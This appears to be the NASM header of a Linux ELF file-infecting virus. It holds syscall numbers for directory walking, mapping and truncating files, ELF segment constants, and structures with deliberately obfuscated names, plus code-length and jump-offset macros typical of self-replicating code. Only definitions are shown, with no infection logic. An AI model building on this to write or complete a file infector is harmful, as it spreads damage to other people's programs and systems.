; SYSCALL
%define     SYS_OPEN        2
%define     SYS_CLOSE       3
%define  SYS_LSEEK  8
%define  SYS_MMAP  9
%define  SYS_UNMAP  11
%define     SYS_EXIT        60
%define  SYS_FTRUNCATE 77
%define     SYS_GETDENTS    217

; OPEN
%define  O_RDONLY   0x0000
%define  O_WRONLY   0x0001
%define  O_RDWR    0x0002
%define  O_DIRECTORY   0q0200000

; DIRENT
%define  D_INO_OFF   0x00
%define  D_OFF_OFF   0x08
%define  D_RECLEN_OFF  0x10
%define  D_TYPE     0x12
%define  D_NAME     0x13
%define     D_REG_FILE          0x8

; MMAP
%define  PROT_EXEC  1
%define  PROT_READ  2
%define  PROT_WRITE  4
%define  MAP_SHARED  1

; LSEEK
%define  SEEK_SET   0x0
%define  SEEK_END   0x2

%define  FAM(x)    [(rbp - asYacIiH_size) + x]
%define  INF(x)    [(rbp - BiAtmoD_size) + x]


%define  CODE_LEN  (KgogLl8SP - _start)
%define  FINJMP_OFF  (JPxPj - _start)
%define  PAGE_SIZE  0x1000


struc asYacIiH
.cFfqKn             resq    1
.j19w4jkMG          resq    1
.I07ULI                 resq    1
.JWHcecBDX7:           resb    PAGE_SIZE
.Rc0zrpnj8u:        resd    1
.dNqOTE0b:     resd    1
.q55H59a0P resq    1
.ltGaulDEj resq 1
endstruc

struc BiAtmoD
.sXiI4VdFk   resq 1
.YuHIhs   resq 1
.ltGaulDEj   resq 1
.P0b9KBM    resb 1
.eN3hl  resq 1
.cKkSa resq 1
.vxKjm resq 1
.BOPGRgU  resq 1
.rSxBdeF  resq 1 
.WaZpVsopfb  resq 1
.zPXhHZ  resq 1
.qKN947   resb 1
.j1vK4   resq 1
.N4hbN  resq 1
.AXYeYjE  resq 1
endstruc

; ELF structures
%define PT_LOAD  0x1
%define PT_NOTE  0x4
%define PF_X  0x1
%define PF_R  0x4
%define SHT_PROGBITS 0x1
%define SHT_STRTAB 0x3
%define SHT_NOTE 0x7
%define SHT_RELA 0x4
%define SHF_ALLOC 0x2
%define SHF_EXECINSTR 0x4

struc impsGxPB
.SO5M4E2N5l:  resb 16
.Krw0VVJFup:  resw 1
.D2wZIS:  resw 1
.rlVEBwEv:  resd 1
.mVL6TXMMr:  resq 1
.PNZytEGfwm:  resq 1
.QN8BA:  resq 1
.kof4qUGvRB:  resd 1
.fHuCn:  resw 1
.EbyJBVf9: resw 1
.LxdOj7Z:  resw 1
.gatJImT: resw 1
.o8hQqdyL0a:  resw 1
.PL6b9rj8h: resw 1
endstruc

struc KCsto
.WKxBPlOdyp:  resd 1
.JEMMgFn7S:  resd 1
.DXAWXqe:  resq 1
.pforSDni1g:  resq 1
.hhvlVPBoI4:  resq 1
.zEakUM:  resq 1
.hVFrCdlV:  resq 1
.cweMk:  resq 1
endstruc

struc i5MveWHzJ
.IBLcgU:  resd 1
.o50PSqB1r:  resd 1
.XVlASx:  resq 1
.Ti2ktE:  resq 1
.Y6nKaOzTvs:  resq 1
.RATfWF:  resq 1
.veoZY3:  resd 1
.mAg6Wg:  resd 1
.auoZ3V resq 1
.eMhFJEqBog  resq 1
endstruc

struc FW1GEB4IBb
.iULhkvVeG4  resq 1
.djQcbT4I   resq 1
.jNajaLFCdO  resq 1
endstruc

%macro PUSHA 0
push rax
push rbx
push rcx
push rdx
push rsi
push rdi
push r8
push r9
push r10
push r11
push r12
push r13
push r14
push r15
%endmacro

%macro POPA 0
pop r15
pop r14
pop r13
pop r12
pop r11
pop r10
pop r9
pop r8
pop rdi
pop rsi
pop rdx
pop rcx
pop rbx
pop rax
%endmacro 